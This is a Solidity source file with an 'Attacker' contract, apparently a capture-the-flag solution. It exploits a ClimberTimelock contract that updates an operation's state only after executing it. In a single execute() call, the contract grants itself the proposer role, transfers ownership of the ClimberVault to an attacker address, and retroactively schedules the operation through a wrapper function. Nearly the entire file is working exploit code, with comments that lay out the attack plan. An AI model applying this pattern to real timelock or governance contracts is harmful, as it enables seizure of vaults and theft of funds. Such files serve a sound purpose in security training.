// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IClimberTImelock {
    function execute(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external payable;

    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;
}

/// @title Attacker
/// @author kaliberpoziomka
/**@dev Exploit ClimberVault contract by using vulnerability in ClimberTimelock.
The attack is possible, because the OperationState in execute() is updated after calling funcitons.
All functions that take place in attack are defined in the dataElements array
Plan of attack:
- grant PROPOSER_ROLE to this contract
- transger ownership over vault to the attacker address
- schedule() - in order to run execute() we need to schedule those actions. 
               Because the state of scheduled operation is updated last, we can schedule actions after running a functions
*/

contract Attacker {

    bytes32 salt;
    uint256[] values;
    address[] targets;
    bytes[] dataElements;

    address timelockAddress;
    address vaultAddress;
    address EOA_attacker_address;

    bytes32 public constant ADMIN_ROLE = keccak256("ADMIN_ROLE");
    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");

    constructor(
        address _timelockAddress,
        address _vaultAddress,
        address _EOA_attacker_address
    ) {
        timelockAddress = _timelockAddress;
        vaultAddress = _vaultAddress;
        EOA_attacker_address = _EOA_attacker_address;
    }
    
    function attack() external {
        salt = "A_BIT_OF_SALT";
        values = [
            0,
            0,
            0];
        targets = [
            address(timelockAddress),
            address(vaultAddress),
            address(this)
        ];
        dataElements = [
            abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this)),
            abi.encodeWithSignature("transferOwnership(address)", EOA_attacker_address),
            // here we do not need to pass arguments, because schedule wrapper is defined below - without this calling this would be impossible
            abi.encodeWithSignature("schedule()")
        ];

        IClimberTImelock(timelockAddress).execute(targets, values, dataElements, salt);
    }
    // This wrapper chedule function is only because we need to put it in dataElements. If we would not wrap it, we would pass arguments recursively infinitely ;o
    function schedule() external {
        IClimberTImelock(timelockAddress).schedule(
            targets,
            values,
            dataElements,
            salt
        );
    }
    

}